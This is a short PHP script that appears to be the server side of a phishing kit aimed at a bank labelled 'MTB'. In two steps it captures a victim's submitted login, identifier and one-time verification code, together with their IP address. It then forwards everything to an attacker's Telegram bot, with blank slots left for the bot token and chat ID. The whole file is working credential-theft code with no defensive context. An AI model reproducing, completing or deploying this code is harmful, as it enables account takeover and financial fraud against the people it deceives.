<?php

  function get_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$token = ""; //token_bot_tg
$chat_id = ""; //your_tg_id

$ip = get_ip();

if($_POST['L'])
{

$_POST['L'] = str_replace('(', '', $_POST['L']);
$_POST['L'] = str_replace(')', '', $_POST['L']);
$_POST['L'] = str_replace('-', '', $_POST['L']);
$_POST['L'] = str_replace(' ', '', $_POST['L']);


$arr = array(
  '⚠️ Status:' => 'Step №1 - MTB',
  '📱 Login: ' => '<code>( '.$_POST['L'].' )</code>',
  '📅 Ident: ' => '<code>( '.$_POST['I'].' )</code>',  
  '🌏 IP:' => $ip 
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
	
}

if($_POST['code'])
{

$arr = array(
  '⚠️ Status:' => 'Step №2 - MTB',
  '🔑 Code: ' => '<code>( '.$_POST['code'].' )</code>',
  '🌏 IP:' => $ip 
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
	
}

?>